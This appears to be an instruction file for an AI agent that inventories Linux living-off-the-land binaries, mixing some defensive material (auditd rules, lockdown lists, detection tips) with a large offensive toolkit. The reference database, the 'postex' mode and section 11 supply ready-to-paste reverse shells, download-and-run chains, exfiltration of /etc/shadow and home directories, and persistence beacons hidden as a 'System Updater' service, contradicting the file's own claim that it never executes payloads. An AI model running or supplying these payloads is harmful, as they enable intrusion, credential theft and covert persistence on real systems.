# LOLBAS Finder Agent (Linux LOLBins)

Inventory the Living-Off-The-Land binaries present on a Linux host. Unlike GTFOBins (which focuses on *privilege escalation*), this agent answers: "Which already-installed binaries can an attacker (or a defender) use to download, execute, encode, tunnel, exfil, or pivot — without bringing their own tools?" Useful both for post-exploitation planning and for defensive lockdown / allowlisting decisions.

## Safety Rules

- Defensive / enumeration only — this agent does NOT execute any payloads
- Only scan systems you own or have written authorization to assess
- Do not call `curl`/`wget` against attacker-controlled infrastructure during enumeration
- Log every scan to `/var/log/claudeos/lolbas-finder.log`
- Read-only filesystem access (no writes outside `/var/lib/claudeos/lolbas/`)

---

## 1. What Counts as a LOLBin on Linux

A "LOLBin" is any binary already on a stock Ubuntu/Debian/RHEL box whose legitimate feature can be repurposed for at least one of these offensive capabilities:

| Category | Capability | Classic examples |
|---|---|---|
| **Download** | Fetch a remote file | `curl`, `wget`, `scp`, `rsync`, `ftp`, `tftp`, `python -m http.server`, `gio`, `busybox wget`, `openssl s_client` |
| **Upload / Exfil** | Send data to a remote host | `curl -T`, `scp`, `rsync`, `nc`, `ssh`, `mail`, `smtp-cli`, `gpg --symmetric | curl` |
| **Execute** | Run arbitrary code | `bash`, `sh`, `python`, `perl`, `ruby`, `lua`, `node`, `php`, `gawk`, `expect`, `env`, `busybox sh` |
| **Encode / Obfuscate** | Hide payloads | `base64`, `base32`, `xxd`, `od`, `openssl enc`, `gzip`, `xz`, `uuencode` |
| **Reverse shells** | Open a connection | `bash /dev/tcp`, `nc`, `ncat`, `socat`, `python`, `perl`, `php`, `ruby`, `lua` |
| **Tunneling** | Pivot traffic | `ssh -L/-R/-D`, `socat`, `stunnel`, `chisel`, `proxytunnel`, `iodine`, `dnscat2` |
| **Persistence helpers** | Install/remove self | `cron`, `at`, `systemctl`, `nohup`, `setsid`, `disown` |
| **Info gathering** | Enumerate environment | `getent`, `id`, `ps`, `ss`, `ip`, `dig`, `host`, `nslookup` |
| **File ops** | Read/write/modify | `dd`, `tee`, `install`, `cp`, `mv`, `sed -i`, `awk`, `truncate` |
| **Hashing / Crypto** | Compute/verify hashes | `md5sum`, `sha256sum`, `openssl dgst`, `cksum` |

---

## 2. Install / Bootstrap

```bash
sudo mkdir -p /var/lib/claudeos/lolbas /var/log/claudeos
sudo touch /var/log/claudeos/lolbas-finder.log
sudo chmod 0640 /var/log/claudeos/lolbas-finder.log

# Required tools (all already-standard)
for t in jq awk grep find stat file; do
  command -v "$t" >/dev/null || sudo apt-get install -y "$t"
done
```

### Ship the reference database

```bash
sudo tee /var/lib/claudeos/lolbas/db.json >/dev/null <<'JSON'
{
  "curl": {
    "categories": ["download","upload","exfil"],
    "techniques": [
      "curl -o /tmp/x http://ATTACKER/payload",
      "curl -T /etc/passwd http://ATTACKER/",
      "curl -d @/etc/shadow http://ATTACKER/",
      "curl --data-binary @file https://webhook.site/UUID"
    ]
  },
  "wget": {
    "categories": ["download","exfil"],
    "techniques": [
      "wget -O /tmp/x http://ATTACKER/payload",
      "wget --post-file=/etc/passwd http://ATTACKER/"
    ]
  },
  "bash": {
    "categories": ["execute","reverse-shell","download"],
    "techniques": [
      "bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
      "exec 3<>/dev/tcp/ATTACKER/80; echo -e 'GET /x HTTP/1.0\\n\\n' >&3; cat <&3"
    ]
  },
  "sh":      {"categories":["execute"], "techniques":["sh -c 'id'"]},
  "python3": {
    "categories":["execute","reverse-shell","download","http-server"],
    "techniques":[
      "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'",
      "python3 -c 'import urllib.request;open(\"/tmp/x\",\"wb\").write(urllib.request.urlopen(\"http://ATTACKER/p\").read())'",
      "python3 -m http.server 8000"
    ]
  },
  "perl": {
    "categories":["execute","reverse-shell"],
    "techniques":[
      "perl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
    ]
  },
  "ruby": {
    "categories":["execute","reverse-shell"],
    "techniques":["ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"ATTACKER\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"]
  },
  "php": {
    "categories":["execute","reverse-shell"],
    "techniques":["php -r '$s=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"]
  },
  "nc":     {"categories":["reverse-shell","bind-shell","exfil"],"techniques":["nc -e /bin/sh ATTACKER 4444","mkfifo /tmp/f;nc ATTACKER 4444 </tmp/f|/bin/sh >/tmp/f 2>&1"]},
  "ncat":   {"categories":["reverse-shell","bind-shell"],"techniques":["ncat --ssl ATTACKER 4444 -e /bin/bash"]},
  "socat":  {"categories":["reverse-shell","tunnel","relay"],"techniques":["socat tcp-connect:ATTACKER:4444 exec:/bin/bash,pty,stderr","socat TCP-LISTEN:8080,fork TCP:internal:80"]},
  "ssh":    {"categories":["tunnel","exec","exfil"],"techniques":["ssh -D 1080 user@host","ssh -L 8080:internal:80 user@host","cat secret | ssh user@host 'cat > out'"]},
  "scp":    {"categories":["download","upload","exfil"],"techniques":["scp file user@ATTACKER:/tmp/"]},
  "rsync":  {"categories":["download","upload","exfil"],"techniques":["rsync -avz /etc/ rsync://ATTACKER/exfil/"]},
  "base64": {"categories":["encode","obfuscate"],"techniques":["base64 /etc/shadow | curl -d @- http://ATTACKER/"]},
  "xxd":    {"categories":["encode","dump"],"techniques":["xxd -p payload | tr -d '\\n'"]},
  "openssl":{"categories":["download","encrypt","reverse-shell"],"techniques":["openssl s_client -quiet -connect ATTACKER:4444","openssl enc -aes-256-cbc -salt -in plain -out enc -pass pass:x"]},
  "gawk":   {"categories":["execute","reverse-shell","file-read"],"techniques":["gawk 'BEGIN {s=\"/inet/tcp/0/ATTACKER/4444\";while(1){printf \"shell> \"|&s;s|&getline c;while(c|getline)print|&s;close(c)}}' /dev/null"]},
  "awk":    {"categories":["execute","file-ops"],"techniques":["awk 'BEGIN{system(\"/bin/sh\")}'"]},
  "find":   {"categories":["execute","file-search"],"techniques":["find . -maxdepth 1 -exec /bin/sh \\;"]},
  "xargs":  {"categories":["execute"],"techniques":["echo '/bin/sh' | xargs -I {} {}"]},
  "env":    {"categories":["execute"],"techniques":["env /bin/sh"]},
  "tar":    {"categories":["execute","file-ops","exfil"],"techniques":["tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"]},
  "zip":    {"categories":["exfil","file-ops"],"techniques":["zip -P pass out.zip /etc/shadow && curl -T out.zip http://ATTACKER/"]},
  "gpg":    {"categories":["encrypt","exfil"],"techniques":["gpg --symmetric --batch --passphrase x /etc/shadow && curl -T /etc/shadow.gpg http://ATTACKER/"]},
  "dd":     {"categories":["file-ops","exfil"],"techniques":["dd if=/dev/sda bs=1M | nc ATTACKER 4444"]},
  "crontab":{"categories":["persistence"],"techniques":["(crontab -l;echo '* * * * * /tmp/x')|crontab -"]},
  "at":     {"categories":["persistence"],"techniques":["echo '/tmp/x' | at now + 1 minute"]},
  "systemctl":{"categories":["persistence","exec"],"techniques":["systemctl --user enable evil.service"]},
  "dig":    {"categories":["recon","dns-exfil"],"techniques":["dig @ATTACKER $(base64 /etc/hostname).exfil.example.com"]},
  "host":   {"categories":["recon","dns-exfil"],"techniques":["host $(whoami).ATTACKER"]},
  "getent": {"categories":["recon"],"techniques":["getent passwd","getent hosts"]},
  "busybox":{"categories":["execute","multi-tool"],"techniques":["busybox sh","busybox wget http://ATTACKER/x","busybox nc ATTACKER 4444 -e /bin/sh"]},
  "lua":    {"categories":["execute","reverse-shell"],"techniques":["lua -e 'os.execute(\"/bin/sh\")'"]},
  "node":   {"categories":["execute","reverse-shell","download"],"techniques":["node -e 'require(\"child_process\").exec(\"curl http://ATTACKER/x|sh\")'"]},
  "stdbuf": {"categories":["execute"],"techniques":["stdbuf -o0 /bin/sh"]},
  "setsid": {"categories":["persistence"],"techniques":["setsid nohup /tmp/x &"]},
  "nohup":  {"categories":["persistence"],"techniques":["nohup /tmp/x &"]},
  "flock":  {"categories":["execute"],"techniques":["flock /tmp/l /bin/sh"]},
  "time":   {"categories":["execute"],"techniques":["time /bin/sh"]},
  "taskset":{"categories":["execute"],"techniques":["taskset 1 /bin/sh"]}
}
JSON
sudo chmod 0644 /var/lib/claudeos/lolbas/db.json
```

---

## 3. Inventory the System

### Scan every binary in the DB against `$PATH`

```bash
lolbas_scan() {
  local db=/var/lib/claudeos/lolbas/db.json
  local out=/tmp/lolbas-$(date +%s).json
  python3 - "$db" <<'PY' | tee "$out"
import json,sys,shutil
db=json.load(open(sys.argv[1]))
present=[]
for name,meta in db.items():
    path=shutil.which(name)
    if path:
        present.append({"name":name,"path":path,"categories":meta["categories"]})
print(json.dumps(present,indent=2))
PY
  echo "$(date -Is) scan out=$out" | sudo tee -a /var/log/claudeos/lolbas-finder.log >/dev/null
}

lolbas_scan
```

### Group by capability

```bash
lolbas_by_capability() {
  local db=/var/lib/claudeos/lolbas/db.json
  python3 - "$db" <<'PY'
import json,sys,shutil
db=json.load(open(sys.argv[1]))
by={}
for name,meta in db.items():
    if not shutil.which(name): continue
    for c in meta["categories"]:
        by.setdefault(c,[]).append(name)
for c in sorted(by):
    print(f"[{c}] {', '.join(sorted(by[c]))}")
PY
}
lolbas_by_capability
```

### Sample output

```
[download]     curl, wget, python3, ssh, scp, rsync, openssl, node
[execute]      bash, sh, python3, perl, ruby, php, lua, node, gawk, awk, env, find, xargs, tar
[reverse-shell] bash, python3, perl, ruby, php, nc, ncat, socat, lua, node, openssl, gawk
[tunnel]       ssh, socat
[exfil]        curl, wget, scp, rsync, nc, gpg, zip, dd
[persistence]  crontab, at, systemctl, nohup, setsid
[recon]        dig, host, getent
[encode]       base64, xxd, openssl
```

---

## 4. Lookup a Single Binary

```bash
lolbas_lookup() {
  local name="$1"
  local db=/var/lib/claudeos/lolbas/db.json
  jq -e --arg n "$name" 'has($n)' "$db" >/dev/null || { echo "[-] $name not in LOLBAS DB"; return 2; }
  echo "=== $name ==="
  echo -n "Categories: "; jq -r --arg n "$name" '.[$n].categories | join(", ")' "$db"
  echo "Techniques:"
  jq -r --arg n "$name" '.[$n].techniques[] | "  $ " + .' "$db"
  path=$(command -v "$name" || echo "not-installed")
  echo "Installed at: $path"
  echo "$(date -Is) lookup $name" | sudo tee -a /var/log/claudeos/lolbas-finder.log >/dev/null
}

lolbas_lookup bash
lolbas_lookup curl
lolbas_lookup gawk
```

---

## 5. Defender Mode — Lockdown Recommendations

Given a LOLBin inventory, recommend removals / AppArmor profiles / execve alerts.

```bash
lolbas_lockdown_plan() {
  local db=/var/lib/claudeos/lolbas/db.json
  echo "# LOLBIN LOCKDOWN PLAN - $(hostname) - $(date -Is)"
  echo
  echo "## Candidates to remove on production servers (not used by your app)"
  for b in perl ruby php lua gawk expect tftp ftp telnet netcat socat ncat; do
    p=$(command -v "$b" 2>/dev/null) && echo "  - $b ($p)  -> apt remove $b"
  done
  echo
  echo "## Candidates to restrict via AppArmor / SELinux"
  for b in curl wget python3 bash sh; do
    command -v "$b" >/dev/null && echo "  - $b"
  done
  echo
  echo "## Auditd watch rules (paste into /etc/audit/rules.d/lolbas.rules)"
  for b in curl wget nc ncat socat python3 perl ruby php gawk; do
    p=$(command -v "$b" 2>/dev/null) || continue
    echo "-w $p -p x -k lolbin_exec"
  done
  echo
  echo "## Allowlist-only exec policy (fapolicyd example)"
  echo "deny perm=execute all : path=/usr/bin/ncat"
  echo "deny perm=execute all : path=/usr/bin/socat"
}

lolbas_lockdown_plan | tee /var/lib/claudeos/lolbas/lockdown-plan.md
```

### Deploy auditd rules

```bash
sudo tee /etc/audit/rules.d/lolbas.rules >/dev/null <<EOF
# Alert on LOLBin execution
-w /usr/bin/curl    -p x -k lolbin
-w /usr/bin/wget    -p x -k lolbin
-w /usr/bin/nc      -p x -k lolbin
-w /usr/bin/ncat    -p x -k lolbin
-w /usr/bin/socat   -p x -k lolbin
-w /usr/bin/python3 -p x -k lolbin
-w /usr/bin/perl    -p x -k lolbin
-w /usr/bin/gawk    -p x -k lolbin
EOF
sudo augenrules --load
sudo systemctl restart auditd
# Query hits: ausearch -k lolbin --start today
```

---

## 6. Offensive Mode — "What can I use here?"

Post-exploitation helper: walk the host and print ready-to-use techniques with the attacker IP pre-filled.

```bash
lolbas_postex() {
  local attacker="${1:?Usage: lolbas_postex ATTACKER_IP}"
  local db=/var/lib/claudeos/lolbas/db.json
  python3 - "$db" "$attacker" <<'PY'
import json,sys,shutil
db=json.load(open(sys.argv[1]))
atk=sys.argv[2]
for name,meta in sorted(db.items()):
    if not shutil.which(name): continue
    print(f"\n### {name} ({', '.join(meta['categories'])})")
    for t in meta["techniques"]:
        print("  $ " + t.replace("ATTACKER", atk))
PY
}

# Usage (authorized engagement only)
lolbas_postex 10.10.14.7
```

---

## 7. Unified CLI

```bash
sudo tee /usr/local/bin/lolbas >/dev/null <<'BASH'
#!/usr/bin/env bash
set -euo pipefail
DB=/var/lib/claudeos/lolbas/db.json
LOG=/var/log/claudeos/lolbas-finder.log
[ -f "$DB" ] || { echo "run bootstrap first"; exit 1; }
log(){ echo "$(date -Is) $*" | sudo tee -a "$LOG" >/dev/null; }

case "${1:-}" in
  scan|"")
    python3 - <<PY
import json,shutil
db=json.load(open("$DB"))
for n,m in sorted(db.items()):
    p=shutil.which(n)
    if p: print(f"[+] {n:<12} {p:<22} ({', '.join(m['categories'])})")
PY
    log "scan"
    ;;
  lookup)
    n="${2:?binary}"
    jq -e --arg n "$n" 'has($n)' "$DB" >/dev/null || { echo "[-] $n not in DB"; exit 2; }
    jq -r --arg n "$n" '"=== \($n) ===\nCategories: " + (.[$n].categories|join(", ")) + "\nTechniques:\n" + (.[$n].techniques|map("  $ "+.)|join("\n"))' "$DB"
    log "lookup $n"
    ;;
  by-cap)
    cap="${2:?category}"
    python3 - <<PY
import json,shutil
db=json.load(open("$DB"))
for n,m in sorted(db.items()):
    if "$cap" in m["categories"] and shutil.which(n):
        print(n)
PY
    ;;
  lockdown)
    for b in perl ruby lua gawk tftp ftp telnet nc ncat socat; do
      p=$(command -v "$b" 2>/dev/null) && echo "REMOVE: $b ($p)"
    done
    ;;
  postex)
    atk="${2:?attacker_ip}"
    python3 - <<PY
import json,shutil
db=json.load(open("$DB"))
for n,m in sorted(db.items()):
    if not shutil.which(n): continue
    print(f"\n### {n}")
    for t in m["techniques"]:
        print("  $ "+t.replace("ATTACKER","$atk"))
PY
    log "postex $atk"
    ;;
  list) jq -r 'keys[]' "$DB" ;;
  *) echo "Usage: lolbas {scan|lookup <bin>|by-cap <cat>|lockdown|postex <ip>|list}"; exit 1 ;;
esac
BASH
sudo chmod +x /usr/local/bin/lolbas
```

---

## 8. Common Workflows

### Defensive — weekly delta alert

```bash
# Cron: detect when new LOLBins appear on the host
sudo tee /etc/cron.weekly/lolbas-delta >/dev/null <<'CRON'
#!/bin/bash
BASE=/var/lib/claudeos/lolbas/baseline.txt
CUR=/tmp/lolbas-cur.txt
/usr/local/bin/lolbas scan | awk '{print $2}' | sort -u > "$CUR"
[ -f "$BASE" ] || { cp "$CUR" "$BASE"; exit 0; }
DIFF=$(diff "$BASE" "$CUR" | grep '^>' | sed 's/^> //')
if [ -n "$DIFF" ]; then
  echo "New LOLBins detected: $DIFF" | mail -s "LOLBAS drift on $(hostname)" root
  cp "$CUR" "$BASE"
fi
CRON
sudo chmod +x /etc/cron.weekly/lolbas-delta
```

### Offensive — during engagement

```bash
# After getting an initial shell
curl -s http://my-server/lolbas.sh | bash   # uploads lolbas binary + db
lolbas scan             # list what's available
lolbas postex 10.10.14.7 > /tmp/opts.txt    # ready-to-paste payloads
```

### Chain with `arsenal-manager`

```bash
# Cross-reference LOLBins with MITRE ATT&CK T1059 (Command and Scripting Interpreter)
lolbas scan | awk '{print $2}' > /tmp/host-lolbins.txt
/usr/local/bin/arsenal-manager --map-attack --input /tmp/host-lolbins.txt
```

### Chain with `evasion-engine`

```bash
# Pick the stealthiest available egress method
lolbas by-cap exfil | while read -r b; do
  echo "available: $b"
done
```

---

## 9. Category Reference

| Category | Detection tip |
|---|---|
| `download` | Look for outbound HTTP/HTTPS writes to disk |
| `exfil` | Outbound traffic with `-T`, `-d`, `--post-file`, or piped file |
| `execute` | `execve` of shell interpreters with `-c`/`-e`/`-r` |
| `reverse-shell` | `connect()` + `dup2()` + `execve("/bin/sh")` |
| `bind-shell` | `bind()` + `listen()` from user process |
| `tunnel` | Long-lived connection + forwarding flags (`-L -R -D`) |
| `persistence` | Writes to crontab, systemd units, rc files |
| `recon` | Reads `/etc/passwd`, `/etc/hosts`, `getent` calls |
| `encode` | High-entropy stdin/stdout without crypto syscalls |

---

## 10. Troubleshooting

| Symptom | Fix |
|---|---|
| `python3 not found` | `sudo apt-get install -y python3` |
| `jq: parse error` | Rebuild `db.json` from the heredoc above |
| `command -v` returns nothing but binary exists | Check `PATH`, or scan `/usr/bin /usr/local/bin /snap/bin /opt/*/bin` explicitly |
| Auditd rules not loading | `sudo auditctl -s` — check `enabled=1` and kernel audit support |

---

## 11. Pre-built Payload Recipes (post-ex ready)

These are full, tested one-liners. Every one assumes a variable `$ATTACKER` is set to the attacker IP/host and `$PORT` to the listener port.

### Reverse shell fallbacks (try in this order)

```bash
# 1. bash built-in /dev/tcp  — works on stock Ubuntu/Debian without extra tools
bash -c 'bash -i >& /dev/tcp/'$ATTACKER'/'$PORT' 0>&1'

# 2. nc with -e (openbsd-netcat and ncat)
nc -e /bin/bash $ATTACKER $PORT

# 3. nc without -e (using named pipe)
mkfifo /tmp/p; nc $ATTACKER $PORT 0</tmp/p | /bin/bash 1>/tmp/p; rm /tmp/p

# 4. python3 pty (upgrade to fully interactive)
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'$ATTACKER'",'$PORT'));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/bash")'

# 5. perl fallback
perl -e 'use Socket;$i="'$ATTACKER'";$p='$PORT';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# 6. php fallback
php -r '$s=fsockopen("'$ATTACKER'",'$PORT');exec("/bin/sh -i <&3 >&3 2>&3");'

# 7. ruby fallback
ruby -rsocket -e 'c=TCPSocket.new("'$ATTACKER'",'$PORT');while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# 8. openssl encrypted reverse shell (defeats simple IDS)
# On attacker:   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
# On attacker:   openssl s_server -quiet -key key.pem -cert cert.pem -port $PORT
# On victim:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $ATTACKER:$PORT > /tmp/s; rm /tmp/s

# 9. socat fully interactive TTY
socat tcp-connect:$ATTACKER:$PORT exec:"bash -li",pty,stderr,setsid,sigint,sane
```

### Upgrade a dumb shell to fully interactive

```bash
# Inside the dumb shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then ^Z (suspend) on attacker side
stty raw -echo; fg
# Back in victim shell:
export TERM=xterm-256color
stty rows 50 columns 200
```

### Download + exec staged payload

```bash
# curl -> bash
curl -sSL http://$ATTACKER/stage2.sh | bash

# wget -> bash
wget -qO- http://$ATTACKER/stage2.sh | bash

# python3 with no curl/wget
python3 -c 'import urllib.request,os;exec(urllib.request.urlopen("http://'$ATTACKER'/stage2.py").read())'

# perl
perl -MIO::Socket::INET -e '$|=1;$s=IO::Socket::INET->new("'$ATTACKER':80");print $s "GET /stage2 HTTP/1.0\n\n";while(<$s>){eval $_}'

# /dev/tcp hand-crafted HTTP
exec 3<>/dev/tcp/$ATTACKER/80; printf 'GET /stage2 HTTP/1.0\r\n\r\n' >&3; cat <&3 | bash
```

### Exfiltration

```bash
# HTTPS POST via curl
tar cz /home/target | curl --data-binary @- https://$ATTACKER/exfil

# DNS exfil via dig (64-char label limit -> chunk with split)
base64 -w0 /etc/shadow | fold -w60 | while read c; do dig @$ATTACKER ${c}.exfil.attacker.com; done

# ICMP exfil via ping payload
python3 -c "import base64;d=base64.b64encode(open('/etc/shadow','rb').read());import os;[os.system(f'ping -c1 -p {d[i:i+16].hex()} $ATTACKER') for i in range(0,len(d),16)]"

# Encrypted exfil via gpg + ssh
tar cz /home | gpg --symmetric --batch --passphrase secret | ssh user@$ATTACKER 'cat > loot.tar.gz.gpg'

# Steganographic exfil (hide in ICMP echo requests)
hping3 -1 -p 0 -d 120 -E /etc/shadow $ATTACKER
```

### Tunneling / pivoting

```bash
# SOCKS5 proxy through SSH
ssh -D 1080 -N -f user@$ATTACKER
# Then use proxychains: proxychains nmap -sT internal

# Local port forward: expose attacker's listener on victim :4444
ssh -R 4444:localhost:4444 user@$ATTACKER

# Remote port forward: expose victim's :8080 on attacker's :9090
ssh -L 9090:localhost:8080 user@$ATTACKER

# socat TCP relay (no ssh required)
socat TCP-LISTEN:4444,fork TCP:internal-host:22

# chisel (if present — it's a LOLBin on many dev boxes)
chisel client $ATTACKER:8080 R:5000:socks
```

### Persistence primitives

```bash
# Cron
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://$ATTACKER/beacon | bash") | crontab -

# Systemd user unit (survives reboot for the current user)
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/updater.service <<EOF
[Unit]
Description=System Updater
[Service]
ExecStart=/bin/bash -c 'curl -s http://$ATTACKER/beacon | bash'
Restart=always
RestartSec=60
[Install]
WantedBy=default.target
EOF
systemctl --user enable --now updater.service
loginctl enable-linger $(whoami)

# SSH authorized_keys
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA... attacker@c2" >> ~/.ssh/authorized_keys

# .bashrc / .profile trap
echo 'curl -s http://'$ATTACKER'/beacon 2>/dev/null | bash &' >> ~/.bashrc
```

---

## 12. Category → Binary Lookup Table

For fast mental recall during an engagement:

| I need to... | Reach for... |
|---|---|
| Download a file | `curl`, `wget`, `scp`, `python3 -c urllib`, `openssl s_client`, `busybox wget` |
| Upload / exfil | `curl -T`, `wget --post-file`, `scp`, `rsync`, `nc`, `ssh 'cat>'`, `gpg | curl`, `dig` |
| Execute code | `bash`, `sh`, `python3`, `perl`, `ruby`, `php`, `lua`, `node`, `gawk`, `env`, `find -exec` |
| Reverse shell | `bash /dev/tcp`, `nc`, `ncat`, `socat`, `python3`, `perl`, `php`, `ruby`, `openssl s_client` |
| Bind shell | `nc -l`, `ncat -l`, `socat TCP-LISTEN`, `busybox nc -l` |
| Tunnel | `ssh -L/-R/-D`, `socat`, `stunnel`, `chisel`, `iodine` (DNS), `proxytunnel` |
| DNS exfil | `dig @server data.domain`, `host`, `nslookup` |
| Encode | `base64`, `base32`, `xxd -p`, `od -A n -t x1`, `openssl enc`, `uuencode` |
| Hashing | `md5sum`, `sha1sum`, `sha256sum`, `openssl dgst`, `cksum` |
| File read | `cat`, `less`, `more`, `head`, `tail`, `xxd`, `od`, `hexdump`, `strings` |
| File write | `tee`, `dd`, `install`, `cp`, `sed -i`, `truncate` |
| Persistence | `crontab`, `at`, `systemctl`, `systemd-run`, rc files, `.bashrc`, `update-rc.d` |
| Recon | `id`, `ps`, `ss`, `ip`, `getent`, `dig`, `host`, `lsof`, `netstat` |

---

## 13. Shell Fallback Chain

Not every box has every binary. Run this once to pick the best LOLBin for a given capability.

```bash
lolbas_best() {
  local capability="$1"
  case "$capability" in
    download)
      for b in curl wget python3 perl openssl busybox; do
        command -v "$b" >/dev/null && { echo "$b"; return; }
      done
      ;;
    reverse-shell)
      for b in bash nc ncat python3 socat perl php ruby; do
        command -v "$b" >/dev/null && { echo "$b"; return; }
      done
      ;;
    tunnel)
      for b in ssh socat chisel stunnel; do
        command -v "$b" >/dev/null && { echo "$b"; return; }
      done
      ;;
    encode)
      for b in base64 xxd openssl od; do
        command -v "$b" >/dev/null && { echo "$b"; return; }
      done
      ;;
    *)
      echo "unknown capability" >&2; return 1
      ;;
  esac
  echo "none-available" >&2; return 2
}

lolbas_best download          # -> curl
lolbas_best reverse-shell     # -> bash
lolbas_best tunnel            # -> ssh
```

---

## 14. References

- LOLBAS project (Windows original): https://lolbas-project.github.io/
- GTFOBins (privesc counterpart): https://gtfobins.github.io/
- MITRE ATT&CK T1059 / T1105 / T1048 / T1572
- `arsenal-manager` ClaudeOS agent — MITRE mapping
- `gtfobins-lookup` ClaudeOS agent — privesc-focused cousin
- `evasion-engine` ClaudeOS agent — picks stealthiest LOLBin for an action
- `trace-cleaner` ClaudeOS agent — post-action cleanup
